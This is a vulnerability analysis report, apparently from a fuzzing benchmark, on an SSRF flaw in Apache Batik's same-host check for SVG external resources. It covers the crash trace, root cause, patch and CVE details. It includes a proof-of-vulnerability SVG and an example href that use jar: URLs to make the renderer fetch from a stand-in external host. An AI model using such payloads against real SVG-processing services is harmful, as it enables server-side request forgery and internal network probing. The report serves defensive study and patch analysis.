# Vulnerability Analysis for cpv_0

## Summary
- **CPV ID**: cpv_0
- **Harness**: BatikOneFDP
- **Vulnerability Type**: Server-Side Request Forgery (SSRF)
- **Origin**: 1-day
- **Release Date**: 09/22/2022
- **References**: 
  - https://nvd.nist.gov/vuln/detail/CVE-2022-38398
  - https://issues.apache.org/jira/browse/BATIK-1331

## Crash Log Analysis
- **Error Type**: FuzzerSecurityIssueMedium: Server Side Request Forgery (SSRF)
- **Crash Location**: org.apache.batik.util.ParsedURLData.java:554
- **Vulnerable Function**: openStreamInternal
- **DEDUP Token**: 9f43c17641ed1b15

### Stack Trace
```
== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueMedium: Server Side Request Forgery (SSRF)
Attempted connection to: jazzer.example.com:80
Requests to destinations based on untrusted data could lead to exfiltration of sensitive data or exposure of internal services.

	at com.code_intelligence.jazzer.sanitizers.ServerSideRequestForgery.checkSsrf(ServerSideRequestForgery.java:127)
	at com.code_intelligence.jazzer.sanitizers.ServerSideRequestForgery.checkSsrfSocket(ServerSideRequestForgery.java:71)
	at java.base/java.net.Socket.connect(Socket.java:633)
	at java.base/java.net.Socket.connect(Socket.java:583)
	at java.base/sun.net.NetworkClient.doConnect(NetworkClient.java:183)
	at java.base/sun.net.www.http.HttpClient.openServer(HttpClient.java:498)
	at java.base/sun.net.www.http.HttpClient.openServer(HttpClient.java:603)
	at java.base/sun.net.www.http.HttpClient.<init>(HttpClient.java:246)
	at java.base/sun.net.www.http.HttpClient.New(HttpClient.java:351)
	at java.base/sun.net.www.http.HttpClient.New(HttpClient.java:373)
	at java.base/sun.net.www.protocol.http.HttpURLConnection.getNewHttpClient(HttpURLConnection.java:1309)
	at java.base/sun.net.www.protocol.http.HttpURLConnection.plainConnect0(HttpURLConnection.java:1242)
	at java.base/sun.net.www.protocol.http.HttpURLConnection.plainConnect(HttpURLConnection.java:1128)
	at java.base/sun.net.www.protocol.http.HttpURLConnection.connect(HttpURLConnection.java:1057)
	at java.base/sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1665)
	at java.base/sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1589)
	at org.apache.batik.util.ParsedURLData.openStreamInternal(ParsedURLData.java:554)
	at org.apache.batik.util.ParsedURLData.openStream(ParsedURLData.java:476)
	at org.apache.batik.util.ParsedURL.openStream(ParsedURL.java:440)
	at org.apache.batik.bridge.SVGImageElementBridge.openStream(SVGImageElementBridge.java:414)
	at org.apache.batik.bridge.SVGImageElementBridge.createImageGraphicsNode(SVGImageElementBridge.java:244)
	at org.apache.batik.bridge.SVGImageElementBridge.buildImageGraphicsNode(SVGImageElementBridge.java:179)
	at org.apache.batik.bridge.SVGImageElementBridge.createGraphicsNode(SVGImageElementBridge.java:121)
	at org.apache.batik.bridge.GVTBuilder.buildGraphicsNode(GVTBuilder.java:213)
	at org.apache.batik.bridge.GVTBuilder.buildComposite(GVTBuilder.java:171)
	at org.apache.batik.bridge.GVTBuilder.build(GVTBuilder.java:82)
	at org.apache.batik.transcoder.SVGAbstractTranscoder.transcode(SVGAbstractTranscoder.java:210)
```

## Vulnerable Code Location(s)

### Location 1 (crash_site)
- **Type**: crash_site
- **File Path**: batik-util/src/main/java/org/apache/batik/util/ParsedURLData.java
- **Function**: openStreamInternal
- **Line Range**: 554-554
- **Column Range**: N/A

### Location 2 (root_cause)
- **Type**: root_cause
- **File Path**: batik-bridge/src/main/java/org/apache/batik/bridge/DefaultExternalResourceSecurity.java
- **Function**: DefaultExternalResourceSecurity (constructor)
- **Line Range**: 82-96
- **Column Range**: N/A

### Code Context

**Root Cause Location (DefaultExternalResourceSecurity.java:82-96):**
```java
} else {
    String docHost    = docURL.getHost();
    String externalResourceHost = externalResourceURL.getHost();
    
    if ((docHost != externalResourceHost) &&
        ((docHost == null) || (!docHost.equals(externalResourceHost)))){
        
        if ( externalResourceURL == null
             ||
             !DATA_PROTOCOL.equals(externalResourceURL.getProtocol()) ) {
        se = new SecurityException
            (Messages.formatMessage(ERROR_EXTERNAL_RESOURCE_FROM_DIFFERENT_URL,
                                    new Object[]{externalResourceURL}));
        }
        
    }
}
```

**The Problem:**
The code attempts to validate that external resources come from the same host as the document by comparing `docHost` with `externalResourceHost`. However, for JAR protocol URLs (e.g., `jar:http://example.com/file.jar!/`), the `getHost()` method returns `null`, which bypasses the security check. The code only checks for the DATA protocol exception but doesn't handle other protocols like JAR that also return null for the host.

**The Fix (from patch):**
```java
String docHost    = docURL.getHost();
String externalResourceHost = externalResourceURL.getHost();
if (externalResourceHost == null && !DATA_PROTOCOL.equals(externalResourceURL.getProtocol())) {
    try {
        externalResourceHost = new URI(externalResourceURL.getPath()).getHost();
    } catch (URISyntaxException e) {
        throw new RuntimeException(e);
    }
}
```

The fix extracts the host from the JAR URL path (which contains the embedded HTTP URL) to properly validate it against the document host.

## CWE Classification
- **CWE-918**: Server-Side Request Forgery (SSRF)

## Vulnerability Description

This is a Server-Side Request Forgery (SSRF) vulnerability in Apache Batik versions 1.0 through 1.14. The vulnerability exists in the `DefaultExternalResourceSecurity` class, which is responsible for ensuring that external resources referenced in SVG documents come from the same host as the document itself.

**Root Cause:**
The security validation logic uses `ParsedURL.getHost()` to compare the document host with the external resource host. However, for JAR protocol URLs (e.g., `jar:http://attacker.com/malicious.jar!/`), the `getHost()` method returns `null`. The code only has a special case for the DATA protocol but doesn't handle JAR or other protocols that return null for the host.

When `externalResourceHost` is `null`, the comparison `(docHost != externalResourceHost)` evaluates to `true` (assuming docHost is not null), but then the nested condition `((docHost == null) || (!docHost.equals(externalResourceHost)))` also evaluates to `true`. However, since the DATA protocol check doesn't match JAR URLs, the code incorrectly allows the request to proceed without throwing a SecurityException.

**Impact:**
An attacker can craft a malicious SVG file with an image element that uses a JAR protocol URL to bypass the same-origin security controls. This allows the attacker to:
- Make unauthorized HTTP GET requests to arbitrary servers
- Exfiltrate sensitive data from internal networks
- Access internal services that should not be exposed
- Perform port scanning of internal infrastructure

**Attack Vector:**
The vulnerability is triggered when Batik processes an SVG file containing an image element with a JAR URL in the `xlink:href` attribute, such as:
```xml
<image xlink:href="jar:http://attacker.com/malicious.jar!/">
```

## POV Analysis

The proof-of-vulnerability (pov_0.blob) is a malicious SVG file that demonstrates the SSRF vulnerability:

```xml
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="450" height="500" viewBox="0 0 450 500">
  <image width="50" height="50" xlink:href="jar:http://jazzer.example.com/f.jar!/">
  </image>
</svg>
```

**Analysis:**
- The SVG contains an `<image>` element with a JAR protocol URL
- The URL `jar:http://jazzer.example.com/f.jar!/` attempts to load a resource from an external server
- When Batik processes this SVG, it attempts to open a network connection to `jazzer.example.com:80`
- The Jazzer sanitizer detects this unauthorized connection attempt and raises a FuzzerSecurityIssueMedium exception
- This demonstrates that the DefaultExternalResourceSecurity control was successfully bypassed

## Patch Analysis

The patch (patch_0.diff) fixes the vulnerability by properly extracting the host from JAR protocol URLs:

**Key Changes in DefaultExternalResourceSecurity.java:**

1. **Added imports** (lines 22-24):
   ```java
   import java.net.URI;
   import java.net.URISyntaxException;
   ```

2. **Added host extraction logic** (lines 32-38):
   ```java
   if (externalResourceHost == null && !DATA_PROTOCOL.equals(externalResourceURL.getProtocol())) {
       try {
           externalResourceHost = new URI(externalResourceURL.getPath()).getHost();
       } catch (URISyntaxException e) {
           throw new RuntimeException(e);
       }
   }
   ```

**How the Fix Works:**
- When `externalResourceHost` is null and the protocol is not DATA, the code now attempts to extract the host from the URL path
- For JAR URLs like `jar:http://example.com/file.jar!/`, the path contains the embedded HTTP URL
- By parsing the path as a URI, the code can extract the actual host (`example.com`) from the embedded URL
- This extracted host is then properly compared with the document host, preventing the bypass
- If the hosts don't match, a SecurityException is thrown as intended

**Fix Metadata:**
- Issue: BATIK-1331
- Commit: bfbccb6ad213c1c2dea4ce6e9210f057e5ac1229
- SVN Revision: 1903462
- Date: August 16, 2022
- Author: Simon Steiner

## Recommendations

- **Suggested CWEs**: [CWE-918]
- **Vulnerability Name**: Apache Batik JAR Protocol SSRF Bypass
- **Severity**: Medium (CVSS 5.3)
- **Affected Versions**: Apache Batik 1.0 through 1.14
- **Fixed Version**: Apache Batik 1.15+
- **Mitigation**: Upgrade to Apache Batik version 1.15 or later

---

**Analysis Complete**: This is a confirmed 1-day vulnerability (CVE-2022-38398) with a clear root cause in the DefaultExternalResourceSecurity class. The vulnerability allowed attackers to bypass same-origin security controls using JAR protocol URLs to perform SSRF attacks. The patch properly addresses the issue by extracting and validating the host from embedded URLs in JAR protocol paths.